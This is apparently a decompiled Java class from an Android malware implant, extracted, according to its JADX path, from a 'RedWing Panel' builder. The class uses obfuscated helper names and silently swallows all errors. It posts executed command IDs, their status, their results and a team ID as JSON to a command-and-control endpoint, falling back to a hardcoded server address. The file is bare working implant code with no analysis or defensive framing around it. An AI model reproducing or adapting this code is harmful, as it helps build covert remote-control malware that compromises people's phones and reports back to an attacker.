package app.mobilex.plus.services;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import v.s.KV57Z6oavcB595B8Dy8Z;
import v.s.ktukzhfmAkOuMU;

/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public class RwDirectPost extends Thread {
    private String mBody;
    private String mCmdId;
    private String mUrl;

    public RwDirectPost(String str, String str2, String str3) {
        this.mUrl = str;
        this.mBody = str2;
        this.mCmdId = str3;
    }

    public static void postResult(String str, String str2, JSONObject jSONObject) {
        try {
            String strDDIMxZXP1V8HdM = ktukzhfmAkOuMU.w9sT1Swbhx3hs;
            if ((strDDIMxZXP1V8HdM == null || strDDIMxZXP1V8HdM.length() <= 0) && ((strDDIMxZXP1V8HdM = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58)) == null || strDDIMxZXP1V8HdM.length() <= 0)) {
                strDDIMxZXP1V8HdM = "http://192.168.0.101:8080";
            }
            String str3 = strDDIMxZXP1V8HdM + "/api/data/commands/update_status";
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("command_id", str);
            jSONObject2.put("status", str2);
            if (jSONObject != null) {
                jSONObject2.put("result", jSONObject);
            }
            String strVekpFI4d1Nc4fakF = KV57Z6oavcB595B8Dy8Z.vekpFI4d1Nc4fakF();
            if (strVekpFI4d1Nc4fakF != null) {
                jSONObject2.put("team_id", strVekpFI4d1Nc4fakF);
            }
            new RwDirectPost(str3, jSONObject2.toString(), str).start();
        } catch (Exception e) {
        }
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(this.mUrl).openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(15000);
            httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            byte[] bytes = this.mBody.getBytes("UTF-8");
            httpURLConnection.setFixedLengthStreamingMode(bytes.length);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
            httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
        } catch (Exception e) {
        }
    }
}
